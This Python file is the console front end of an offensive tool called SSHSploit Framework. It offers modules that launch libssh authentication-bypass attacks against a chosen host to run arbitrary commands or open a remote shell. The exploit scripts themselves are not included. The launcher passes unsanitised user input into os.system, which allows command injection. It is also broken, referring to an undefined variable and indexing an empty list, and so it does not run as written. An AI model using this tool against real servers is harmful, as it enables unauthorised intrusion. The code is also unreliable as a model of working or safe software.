import os

os.system("printf '\033]2;SSHSploit Framework\a'")

import sys
import subprocess
import readline
import time

Q = '\033[1;77m[?] \033[0m'
G = '\033[1;34m[*] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
E = '\033[1;31m[-] \033[0m'

rhost = ""
rport = ""
cmd = ""

attack = ""
pwd = 0
location = []

readline.parse_and_bind("tab: complete")

def banner():
    os.system("clear")
    os.system("cat banner/banner.txt")
    print("")
    print("SSHSploit Framework v1.0")
    print("------------------------")
    print("")

def main():
    ui = input('\033[4msshsploit\033[0m> ').strip(" ")
    ui = ui.split()
    while True:
        if ui == []:
            pass
        elif ui[0] == "exit":
            sys.exit()
        elif ui[0] == "clear":
            os.system("clear")
        elif ui[0] == "update":
            os.system("chmod +x etc/update.sh && etc/update.sh")
        elif ui[0] == "help":
            print("")
            print("Core Commands")
            print("=============")
            os.system("cat data/cmds/core_cmds.txt")
            print("")
        elif ui[0] == "modules":
            print("")
            print("Modules")
            print("=======")
            print("")
            os.system("cat data/modules/modules.txt")
            print("")
        elif ui[0] == "use":
            if len(ui) < 2:
                print("Usage: use <module>")
            else:
                attack = ui[1]
                if attack == "libssh_rce_noauth" or attack == "libssh_shell_noauth":
                    location[pwd] = c[1]
                    mod = input('\033[4msshsploit\033[0m(\033[1;31m'+attack+'\033[0m)> ').strip(" ")
                    mod = mod.split()
                    while True:
                        if mod == []:
                            pass
                        elif mod[0] == "back":
                            pwd -= 1
                            location = location[0:-1]
                            if location == []:
                                pwd = 0
                                break
                        elif mod[0] == "set":
                            if len(mod) < 3:
                                print("Usage: set <option> <value>")
                            else:
                                if attack == "libssh_rce_noauth":
                                    if mod[1].lower() == "rhost":
                                        rhost = mod[2]
                                    elif mod[1].lower() == "rport":
                                        rport = mod[2]
                                    elif mod[1].lower() == "cmd":
                                        cmd = mod[2]
                                    else:
                                        print(E+"Options is not found!")
                                else:
                                    if mod[1].lower() == "rhost":
                                        rhost = mod[2]
                                    elif mod[1].lower() == "rport":
                                        rport = mod[2]
                                    else:
                                        print(E+"Options is not found!")
                        elif mod[0] == "options":
                            if attack == "libssh_rce_noauth":
                                os.system("ruby data/options/options.rb libssh_rce_noauth "+rhost+" "+rport+" "+cmd)
                            else:
                                os.system("ruby data/options/options.rb libssh_shell_noauth "+rhost+" "+rport)
                        elif mod[0] == "use":
                            if len(mod) < 2:
                                print("Usage: use <module>")
                            else:
                                attack = mod[1]
                                if attack == "libssh_rce_noauth" or attack == "libssh_shell_noauth":
                                    pwd += 1
                                    location[pwd] = mod[1]
                                else:
                                    print(E+"Module is not found!")
                        elif mod[0] == "run":
                            if rhost == "" or rport == "":
                                print(E+"Target is not specified!")
                            else:
                                if attack == "libssh_rce_noauth":
                                    if cmd == "":
                                        print(E+"Command for RCE is not specified!")
                                    else:
                                        print(G+"Starting libssh_rce_noauth attack...")
                                        os.system("python3 modules/libssh_rce_noauth.py "+rhost+" -p "+rport+" -v '"+cmd+"'")
                                elif attack == "libssh_shell_noauth":
                                    print(G+"Starting libssh_shell_noauth attack...")
                                    os.system("python3 modules/libssh_shell_noauth.py "+rhost+" -p "+rport+" -v --shell")
                        elif mod[0] == "clear":
                            os.system("clear")
                        elif mod[0] == "exit":
                            sys.exit()
                        elif mod[0] == "update":
                            os.system("chmod +x etc/update.sh && etc/update.sh")
                        elif mod[0] == "help":
                            print("")
                            print("Core Commands")
                            print("=============")
                            os.system("cat data/cmds/core_cmds.txt")
                            print("")
                            print("Module Commands")
                            print("===============")
                            os.system("cat data/cmds/module_cmds.txt")
                            print("")
                        else:
                            print(E+"Unrecognized command!")
                        mod = input('\033[4msshsploit\033[0m(\033[1;31m'+attack+'\033[0m)> ').strip(" ")
                        mod = mod.split()
                else:
                    print(E+"Module is not found!")
        else:
            print(E+"Unrecognized command!")
        ui = input('\033[4msshsploit\033[0m> ').strip(" ")
        ui = ui.split()
        
banner()
main()